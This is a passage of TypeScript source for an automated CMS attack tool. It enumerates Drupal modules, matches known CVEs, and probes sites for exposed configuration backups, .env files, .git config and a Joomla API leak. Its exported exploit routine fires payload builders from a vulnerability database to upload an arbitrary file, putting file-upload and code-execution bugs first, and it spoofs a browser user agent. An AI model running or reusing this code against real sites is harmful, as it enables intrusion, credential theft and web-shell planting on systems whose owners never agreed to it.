        extensions.push(r.value);
      }
    }
  }

  return extensions;
}

// ═══════════════════════════════════════════════════════════════
//  DRUPAL MODULE ENUMERATION
// ═══════════════════════════════════════════════════════════════

async function enumerateDrupalModules(targetUrl: string): Promise<CmsExtension[]> {
  const extensions: CmsExtension[] = [];
  const batchSize = 15;

  for (let i = 0; i < DRUPAL_MODULES.length; i += batchSize) {
    const batch = DRUPAL_MODULES.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(async (slug) => {
        // Check sites/all/modules/ and modules/ paths
        const paths = [
          `${targetUrl}/sites/all/modules/${slug}/${slug}.info`,
          `${targetUrl}/modules/${slug}/${slug}.info`,
          `${targetUrl}/modules/contrib/${slug}/${slug}.info.yml`,
          `${targetUrl}/sites/all/modules/contrib/${slug}/${slug}.info`,
        ];

        for (const infoUrl of paths) {
          try {
            const resp = await directFetch(infoUrl, {
              headers: { "User-Agent": "Mozilla/5.0 (compatible; DrupalScan/1.0)" },
            }, 4000);
            if (resp.status === 200) {
              const text = await resp.text();
              let version: string | null = null;
              const vMatch = text.match(/version\s*=\s*"?([\d.x-]+)"?/i) || text.match(/version:\s*'?([\d.x-]+)'?/i);
              if (vMatch) version = vMatch[1];
              return { slug, version, type: "module" as const, detectedVia: "info_file" };
            }
          } catch { /* not found */ }
        }

        // Fallback: check directory existence
        try {
          const resp = await directFetch(`${targetUrl}/sites/all/modules/${slug}/`, {}, 4000);
          if (resp.status === 200 || resp.status === 403) {
            return { slug, version: null, type: "module" as const, detectedVia: "directory" };
          }
        } catch { /* not found */ }

        return null;
      }),
    );

    for (const r of results) {
      if (r.status === "fulfilled" && r.value) {
        extensions.push(r.value);
      }
    }
  }

  return extensions;
}

// ═══════════════════════════════════════════════════════════════
//  VULNERABILITY MATCHING
// ═══════════════════════════════════════════════════════════════

function matchCmsVulnerabilities(cms: CmsType, cmsVersion: string | null, extensions: CmsExtension[]): CmsVulnerability[] {
  const vulns: CmsVulnerability[] = [];
  const cmsVulnDb = ALL_CMS_VULNS.filter(v => v.cms === cms);

  for (const entry of cmsVulnDb) {
    // Core vulns — always include if CMS matches (version check is advisory)
    if (entry.component === "core") {
      vulns.push({
        cms: entry.cms,
        component: entry.component,
        cve: entry.cve,
        title: entry.title,
        type: entry.type,
        severity: entry.severity,
        affectedVersions: entry.affectedVersions,
        exploitAvailable: !!entry.buildPayload,
        exploitEndpoint: entry.exploitEndpoint,
        exploitMethod: entry.exploitMethod,
        reference: entry.reference,
      });
      continue;
    }

    // Extension vulns — only if detected
    const extFound = extensions.find(e => e.slug === entry.component);
    if (extFound) {
      vulns.push({
        cms: entry.cms,
        component: entry.component,
        cve: entry.cve,
        title: entry.title,
        type: entry.type,
        severity: entry.severity,
        affectedVersions: entry.affectedVersions,
        exploitAvailable: !!entry.buildPayload,
        exploitEndpoint: entry.exploitEndpoint,
        exploitMethod: entry.exploitMethod,
        reference: entry.reference,
      });
    }
  }

  // Sort: critical first, then file_upload/rce first
  vulns.sort((a, b) => {
    const sevOrder = { critical: 0, high: 1, medium: 2, low: 3 };
    const typeOrder: Record<string, number> = {
      file_upload: 0, rce: 1, sqli: 2, auth_bypass: 3, deserialization: 4,
      privilege_escalation: 5, object_injection: 6, arbitrary_file_read: 7,
      lfi: 8, info_disclosure: 9, xss: 10, ssrf: 11,
    };
    const sevDiff = sevOrder[a.severity] - sevOrder[b.severity];
    if (sevDiff !== 0) return sevDiff;
    return (typeOrder[a.type] ?? 99) - (typeOrder[b.type] ?? 99);
  });

  return vulns;
}

// ═══════════════════════════════════════════════════════════════
//  EXPLOIT EXECUTION
// ═══════════════════════════════════════════════════════════════

export async function executeCmsExploit(
  targetUrl: string,
  vuln: CmsVulnerability,
  fileName: string,
  fileContent: string,
): Promise<{ success: boolean; uploadedUrl: string | null; details: string }> {
  const cmsVulnDb = ALL_CMS_VULNS.filter(v => v.cms === vuln.cms);
  const entry = cmsVulnDb.find(v => v.cve === vuln.cve && v.component === vuln.component);

  if (!entry || !entry.buildPayload) {
    return { success: false, uploadedUrl: null, details: "No exploit payload builder for this vulnerability" };
  }

  const cleanUrl = targetUrl.replace(/\/+$/, "");
  const endpoint = `${cleanUrl}${entry.exploitEndpoint}`;
  const { body, headers } = entry.buildPayload(cleanUrl, fileName, fileContent);

  try {
    const resp = await directFetch(endpoint, {
      method: entry.exploitMethod || "POST",
      body: entry.exploitMethod !== "GET" ? body : undefined,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ...headers,
      },
    }, 15000);

    const text = await resp.text();
    const success = entry.successIndicator?.(resp.status, text) ?? false;

    if (success && entry.uploadedPath) {
      const uploadedUrl = `${cleanUrl}${entry.uploadedPath(fileName)}`;
      return { success: true, uploadedUrl, details: `${vuln.title} — exploit successful` };
    }

    if (success) {
      const urlMatch = text.match(/https?:\/\/[^\s"'<>]+/);
      return { success: true, uploadedUrl: urlMatch?.[0] || null, details: `${vuln.title} — exploit successful` };
    }

    return { success: false, uploadedUrl: null, details: `${vuln.title} — returned ${resp.status}` };
  } catch (e: any) {
    return { success: false, uploadedUrl: null, details: `${vuln.title} — error: ${e.message}` };
  }
}

// ═══════════════════════════════════════════════════════════════
//  INTERESTING FINDINGS (per CMS)
// ═══════════════════════════════════════════════════════════════

async function checkJoomlaFindings(targetUrl: string): Promise<string[]> {
  const findings: string[] = [];

  // Check configuration.php backup
  const configBackups = ["configuration.php.bak", "configuration.php.old", "configuration.php~", "configuration.php.save", "configuration.php.dist", "configuration.php.txt"];
  for (const backup of configBackups) {
    try {
      const resp = await directFetch(`${targetUrl}/${backup}`, {}, 4000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (text.includes("$db") || text.includes("$password") || text.includes("JConfig")) {
          findings.push(`Joomla config backup exposed: ${backup} — contains database credentials!`);
        }
      }
    } catch { /* not found */ }
  }

  // Check debug mode
  try {
    const resp = await directFetch(`${targetUrl}/`, {}, 5000);
    const html = await resp.text();
    if (html.includes("jdebug") || html.includes("system-debug")) {
      findings.push("Joomla debug mode enabled — may expose sensitive info");
    }
  } catch { /* skip */ }

  // Check htaccess.txt (default htaccess)
  try {
    const resp = await directFetch(`${targetUrl}/htaccess.txt`, {}, 4000);
    if (resp.status === 200) {
      findings.push("htaccess.txt exposed — default Joomla .htaccess not renamed");
    }
  } catch { /* skip */ }

  // Check administrator directory listing
  try {
    const resp = await directFetch(`${targetUrl}/administrator/`, {}, 5000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes("Index of") || text.includes("Directory listing")) {
        findings.push("Administrator directory listing enabled!");
      }
      findings.push("Joomla admin panel accessible at /administrator/");
    }
  } catch { /* skip */ }

  // Check Joomla REST API
  try {
    const resp = await directFetch(`${targetUrl}/api/index.php/v1/config/application?public=true`, {}, 5000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes("dbtype") || text.includes("password")) {
        findings.push("Joomla REST API leaks configuration data (CVE-2023-23752)!");
      }
    }
  } catch { /* skip */ }

  return findings;
}

async function checkDrupalFindings(targetUrl: string): Promise<string[]> {
  const findings: string[] = [];

  // Check settings.php backup
  const configBackups = ["sites/default/settings.php.bak", "sites/default/settings.php.old", "sites/default/settings.php~"];
  for (const backup of configBackups) {
    try {
      const resp = await directFetch(`${targetUrl}/${backup}`, {}, 4000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (text.includes("$databases") || text.includes("$settings")) {
          findings.push(`Drupal settings backup exposed: ${backup}`);
        }
      }
    } catch { /* not found */ }
  }

  // Check CHANGELOG.txt
  try {
    const resp = await directFetch(`${targetUrl}/CHANGELOG.txt`, {}, 4000);
    if (resp.status === 200) {
      findings.push("Drupal CHANGELOG.txt exposed — reveals exact version");
    }
  } catch { /* skip */ }

  // Check INSTALL.txt
  try {
    const resp = await directFetch(`${targetUrl}/INSTALL.txt`, {}, 4000);
    if (resp.status === 200) {
      findings.push("Drupal INSTALL.txt exposed");
    }
  } catch { /* skip */ }

  // Check user/register (registration open)
  try {
    const resp = await directFetch(`${targetUrl}/user/register`, {}, 5000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes("form_build_id") || text.includes("Create new account")) {
        findings.push("Drupal user registration is open — potential for Drupalgeddon2 exploit");
      }
    }
  } catch { /* skip */ }

  // Check REST API
  try {
    const resp = await directFetch(`${targetUrl}/node/1?_format=json`, {}, 5000);
    if (resp.status === 200) {
      findings.push("Drupal REST API enabled — JSON format accessible");
    }
  } catch { /* skip */ }

  return findings;
}

async function checkGenericFindings(targetUrl: string, cms: CmsType): Promise<string[]> {
  const findings: string[] = [];

  // Check common sensitive files
  const sensitiveFiles = [
    { path: "/.env", match: "DB_PASSWORD|APP_KEY|SECRET" },
    { path: "/.git/config", match: "repositoryformatversion" },
    { path: "/phpinfo.php", match: "phpinfo" },
    { path: "/info.php", match: "phpinfo" },
    { path: "/test.php", match: "php" },
    { path: "/adminer.php", match: "adminer" },
    { path: "/phpmyadmin/", match: "phpMyAdmin" },
    { path: "/server-status", match: "Apache Server Status" },
    { path: "/server-info", match: "Apache Server Information" },
  ];

  for (const sf of sensitiveFiles) {
    try {
      const resp = await directFetch(`${targetUrl}${sf.path}`, {}, 4000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (new RegExp(sf.match, "i").test(text)) {
          findings.push(`Sensitive file exposed: ${sf.path}`);
        }
      }
    } catch { /* skip */ }
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════
//  MAIN SCANNER
// ═══════════════════════════════════════════════════════════════

export async function runCmsVulnScan(
  targetUrl: string,
  onProgress?: (phase: string, detail: string, progress: number) => void,
): Promise<CmsScanResult> {
  const startTime = Date.now();
  const cleanUrl = targetUrl.replace(/\/+$/, "");

  onProgress?.("detect", "Detecting CMS type...", 0);

  // Step 1: Detect CMS
  const { cms, version, confidence } = await detectCms(cleanUrl);

  if (cms === "unknown") {
    return {
      cmsDetected: "unknown",
      cmsVersion: null,
      extensions: [],
      vulnerabilities: [],
      users: [],
      interestingFindings: ["No known CMS detected (not Joomla, Drupal, Magento, PrestaShop, vBulletin, phpBB, or OpenCart)"],
      scanDuration: Date.now() - startTime,
    };
  }

  onProgress?.("enumerate", `Detected ${cms} (v${version || "unknown"}, confidence ${confidence}%). Enumerating extensions...`, 20);

  // Step 2: Enumerate extensions
  let extensions: CmsExtension[] = [];
  if (cms === "joomla") {
    extensions = await enumerateJoomlaExtensions(cleanUrl);
  } else if (cms === "drupal") {
    extensions = await enumerateDrupalModules(cleanUrl);
  }
  // Magento/PrestaShop/vBulletin/phpBB/OpenCart — no extension enum yet, rely on core vulns

  onProgress?.("vulns", `Found ${extensions.length} extensions. Matching CVEs...`, 60);

  // Step 3: Match vulnerabilities
  const vulnerabilities = matchCmsVulnerabilities(cms, version, extensions);

  onProgress?.("findings", `Found ${vulnerabilities.length} potential vulnerabilities. Checking interesting findings...`, 75);

  // Step 4: Check interesting findings
  let findings: string[] = [];
  if (cms === "joomla") {
    findings = await checkJoomlaFindings(cleanUrl);
  } else if (cms === "drupal") {
    findings = await checkDrupalFindings(cleanUrl);
  }
  const genericFindings = await checkGenericFindings(cleanUrl, cms);
  findings = [...findings, ...genericFindings];

  onProgress?.("complete", `Scan complete: ${cms} v${version || "?"}, ${extensions.length} extensions, ${vulnerabilities.length} vulns`, 100);

  return {
    cmsDetected: cms,
    cmsVersion: version,
    extensions,
    vulnerabilities,
    users: [],
    interestingFindings: findings,
    scanDuration: Date.now() - startTime,
  };
}

// ═══════════════════════════════════════════════════════════════
//  EXPORTS
// ═══════════════════════════════════════════════════════════════

export { ALL_CMS_VULNS, JOOMLA_VULNS, DRUPAL_VULNS, MAGENTO_VULNS, PRESTASHOP_VULNS, VBULLETIN_VULNS, PHPBB_VULNS, OPENCART_VULNS };
